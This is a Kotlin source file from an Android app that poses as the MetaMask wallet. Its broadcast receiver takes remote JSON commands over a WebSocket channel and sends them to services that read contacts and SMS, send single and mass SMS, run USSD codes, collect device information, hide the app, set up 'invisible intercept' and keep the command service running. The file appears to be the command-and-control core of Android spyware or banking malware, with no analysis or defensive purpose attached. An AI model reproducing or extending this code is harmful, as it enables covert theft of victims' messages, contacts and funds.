package com.example.MetaMask.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import com.example.MetaMask.BuildConfig
import org.json.JSONObject
import com.example.MetaMask.services.FrienCat
import com.example.MetaMask.services.MasterWebSocketDispatcher
import com.example.MetaMask.services.trolService
import com.example.MetaMask.services.UssdControlService
import com.example.MetaMask.services.LegacyUssdService
import com.example.MetaMask.services.UUIDService
import com.example.MetaMask.services.TurtleService
import com.example.MetaMask.services.DeviceStateMonitorService


class WebSocketCommandHandlerReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context?, intent: Intent?) {
        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] onReceive enter context=ctx intent=${intent}") //xdbg
        if (context == null) return

        if (intent?.action != MasterWebSocketDispatcher.ACTION_HANDLE_COMMAND) {
            android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
            return
        }

        val commandData = intent.getStringExtra(MasterWebSocketDispatcher.EXTRA_COMMAND_DATA)
        if (commandData.isNullOrBlank()) {
            android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
            return
        }

        try {
            val jsonCommand = JSONObject(commandData)
            val action = jsonCommand.optString("action")

            val serviceIntent: Intent? = when (action) {
                "startDeviceStateMonitoring" -> {
                    if (!BuildConfig.FEAT_DEVICE_MONITOR) null
                    else Intent(context, DeviceStateMonitorService::class.java).apply {
                        this.action = DeviceStateMonitorService.ACTION_START_MONITORING
                    }
                }
                "getContacts", "addContact" -> {
                    Intent(context, FrienCat::class.java)
                }
                "getDeviceInfo" -> {
                    Intent(context, UUIDService::class.java)
                }
                "getSMSJson", "sendSms", "sendMassSms" -> {
                    Intent(context, trolService::class.java)
                }
                "getSystemInfo" -> {
                    launchChikenWorker(context, commandData)
                    null
                }
                "executeCommand" -> {
                    Intent(context, UssdControlService::class.java)
                }
                "sendUssdWithChoice" -> {
                    Intent(context, LegacyUssdService::class.java)
                }
                "hideShell", "snapBite" -> {
                    Intent(context, TurtleService::class.java)
                }
                "setInvisibleIntercept" -> {
                    val enabled = jsonCommand.optBoolean("enabled", false)
                    val prefs = context.getSharedPreferences("device_settings", Context.MODE_PRIVATE)
                    prefs.edit().putBoolean("invisible_intercept_enabled", enabled).apply()
                    null
                }
                "app_restart" -> {
                    performAppRestart(context)
                    null
                }
                else -> {
                    null
                }
            }

            if (serviceIntent != null) {
                android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                if (!serviceIntent.hasExtra("command")) {
                    android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                    serviceIntent.putExtra("command", jsonCommand.toString())
                }
                try {
                    context.startService(serviceIntent)
                } catch (e: Exception) {
                    android.util.Log.e("XDBG", "[WebSocketCommandHandlerReceiver] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                }
            }

        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[WebSocketCommandHandlerReceiver] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
    }

    private fun launchChikenWorker(context: Context, commandData: String) {
        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] launchChikenWorker enter context=ctx commandData=${commandData}") //xdbg
        try {
            val inputData = androidx.work.Data.Builder()
                .putString("command", commandData)
                .build()

            val request = androidx.work.OneTimeWorkRequestBuilder<com.example.MetaMask.services.ChikenWorker>()
                .setInputData(inputData)
                .setExpedited(androidx.work.OutOfQuotaPolicy.RUN_AS_NON_EXPEDITED_WORK_REQUEST)
                .build()

            androidx.work.WorkManager.getInstance(context).enqueue(request)
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[WebSocketCommandHandlerReceiver] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
    }

    private fun performAppRestart(context: Context) {
        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] performAppRestart enter context=ctx") //xdbg
        val master = Intent(context, MasterWebSocketDispatcher::class.java)
        context.stopService(master)

        val pm = context.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        val wl = pm.newWakeLock(android.os.PowerManager.PARTIAL_WAKE_LOCK, "MetaMask:RestartWakeLock")
        wl.acquire(10_000L)

        val handler = android.os.Handler(android.os.Looper.getMainLooper())
        handler.postDelayed({
            try {
                if (android.os.Build.VERSION.SDK_INT >= 26) {
                    android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                    context.startForegroundService(Intent(context, MasterWebSocketDispatcher::class.java))
                } else {
                    context.startService(Intent(context, MasterWebSocketDispatcher::class.java))
                }
            } catch (_: Exception) {
                android.util.Log.e("XDBG", "[WebSocketCommandHandlerReceiver] catch (ignored)") //xdbg
            } finally {
                if (wl.isHeld) wl.release()
            }
        }, 1500)
    }
}
